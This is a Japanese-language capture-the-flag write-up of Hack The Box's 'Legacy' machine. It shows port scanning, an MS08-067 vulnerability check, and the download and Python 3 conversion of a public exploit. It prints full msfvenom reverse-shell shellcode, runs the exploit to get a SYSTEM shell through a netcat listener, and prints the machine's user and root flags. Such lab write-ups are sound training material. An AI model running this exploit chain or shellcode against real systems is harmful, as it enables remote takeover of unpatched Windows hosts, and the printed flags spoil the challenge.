https://app.hackthebox.com/machines/Legacy
## STEP 1
`ms08-067`があるっぽい
```sh
└─$ rustscan -a 10.129.22.40 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
HACK THE PLANET

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.22.40:135
Open 10.129.22.40:139
Open 10.129.22.40:445
10.129.22.40 -> [135,139,445]
```
```sh
└─$ nmap -n -Pn -p445 --script=smb-vuln-ms08-067 10.129.22.40
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 22:39 EDT
Nmap scan report for 10.129.22.40
Host is up (0.53s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
```


## STEP 2
MS08-067のPoCをダウンロード
```sh
└─$ wget https://raw.githubusercontent.com/andyacer/ms08_067/refs/heads/master/ms08_067_2018.py   
--2025-04-15 09:04:55--  https://raw.githubusercontent.com/andyacer/ms08_067/refs/heads/master/ms08_067_2018.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12003 (12K) [text/plain]
Saving to: ‘ms08_067_2018.py’

ms08_067_2018.py                                           100%[========================================================================================================================================>]  11.72K  --.-KB/s    in 0.004s  

2025-04-15 09:04:56 (3.09 MB/s) - ‘ms08_067_2018.py’ saved [12003/12003]
```
PoCはPython2.x用ぽいので、`2to3-2.7`でPython3.x用に変換
```sh
└─$ python3.13 ms08_067_2018.py         
  File "/home/kali/ms08_067_2018.py", line 13
    except ImportError, _:
           ^^^^^^^^^^^^^^
SyntaxError: multiple exception types must be parenthesized


└─$ 2to3-2.7 --no-diffs -w ms08_067_2018.py
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: Refactored ms08_067_2018.py
RefactoringTool: Files that were modified:
RefactoringTool: ms08_067_2018.py


└─$ python3.13 ms08_067_2018.py
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################


Usage: ms08_067_2018.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

Also: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```
PoC内のリバースシェル用のShellcodeを書き換える、律義にPoC内にShellcode作成のmsfvenomコマンドが書いてあったのでまねる
```sh
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xc0\x97\xe5\xbe\x83\xee\xfc\xe2\xf4\x3c\x7f\x67\xbe"
"\xc0\x97\x85\x37\x25\xa6\x25\xda\x4b\xc7\xd5\x35\x92\x9b"
"\x6e\xec\xd4\x1c\x97\x96\xcf\x20\xaf\x98\xf1\x68\x49\x82"
"\xa1\xeb\xe7\x92\xe0\x56\x2a\xb3\xc1\x50\x07\x4c\x92\xc0"
"\x6e\xec\xd0\x1c\xaf\x82\x4b\xdb\xf4\xc6\x23\xdf\xe4\x6f"
"\x91\x1c\xbc\x9e\xc1\x44\x6e\xf7\xd8\x74\xdf\xf7\x4b\xa3"
"\x6e\xbf\x16\xa6\x1a\x12\x01\x58\xe8\xbf\x07\xaf\x05\xcb"
"\x36\x94\x98\x46\xfb\xea\xc1\xcb\x24\xcf\x6e\xe6\xe4\x96"
"\x36\xd8\x4b\x9b\xae\x35\x98\x8b\xe4\x6d\x4b\x93\x6e\xbf"
"\x10\x1e\xa1\x9a\xe4\xcc\xbe\xdf\x99\xcd\xb4\x41\x20\xc8"
"\xba\xe4\x4b\x85\x0e\x33\x9d\xff\xd6\x8c\xc0\x97\x8d\xc9"
"\xb3\xa5\xba\xea\xa8\xdb\x92\x98\xc7\x68\x30\x06\x50\x96"
"\xe5\xbe\xe9\x53\xb1\xee\xa8\xbe\x65\xd5\xc0\x68\x30\xee"
"\x90\xc7\xb5\xfe\x90\xd7\xb5\xd6\x2a\x98\x3a\x5e\x3f\x42"
"\x72\xd4\xc5\xff\xef\xb4\xd0\x94\x8d\xbc\xc0\x86\xb9\x37"
"\x26\xfd\xf5\xe8\x97\xff\x7c\x1b\xb4\xf6\x1a\x6b\x45\x57"
"\x91\xb2\x3f\xd9\xed\xcb\x2c\xff\x15\x0b\x62\xc1\x1a\x6b"
"\xa8\xf4\x88\xda\xc0\x1e\x06\xe9\x97\xc0\xd4\x48\xaa\x85"
"\xbc\xe8\x22\x6a\x83\x79\x84\xb3\xd9\xbf\xc1\x1a\xa1\x9a"
"\xd0\x51\xe5\xfa\x94\xc7\xb3\xe8\x96\xd1\xb3\xf0\x96\xc1"
"\xb6\xe8\xa8\xee\x29\x81\x46\x68\x30\x37\x20\xd9\xb3\xf8"
"\x3f\xa7\x8d\xb6\x47\x8a\x85\x41\x15\x2c\x15\x0b\x62\xc1"
"\x8d\x18\x55\x2a\x78\x41\x15\xab\xe3\xc2\xca\x17\x1e\x5e"
"\xb5\x92\x5e\xf9\xd3\xe5\x8a\xd4\xc0\xc4\x1a\x6b";
```
エクスプロイト試行！
```sh
└─$ python3.13 ms08_067_2018.py 10.129.19.250 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.129.19.250[\pipe\browser]
Exploit finis
```
リバースシェル取得！（ちなみにこのエクスプロイトは１回しかささらなさそう）
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.19.250] 1042
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```
windowsXPは`whoami`がないので、Kaliの`Whoami.exe`をsmbサーバ経由で実行させる
```sh
└─$ plocate whoami.exe      
/usr/share/windows-resources/binaries/whoami.exe


└─$ cp /usr/share/windows-resources/binaries/whoami.exe .


└─$ impacket-smbserver share .
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
無事SYSTEM権限でした
```bat
C:\>\\10.10.16.3\share\whoami.exe
\\10.10.16.3\share\whoami.exe
NT AUTHORITY\SYSTEM
```
`dir`コマンドでフラグを探索、ユーザフラグ・ルートフラグゲット
```bat
C:\WINDOWS\system32>cd c:\
cd c:\


C:\>dir user.txt /s
dir user.txt /s
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)   6.400.479.232 bytes free


C:\>type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f


C:\>dir root.txt /s
dir root.txt /s
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)   6.400.524.288 bytes free


C:\>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
```
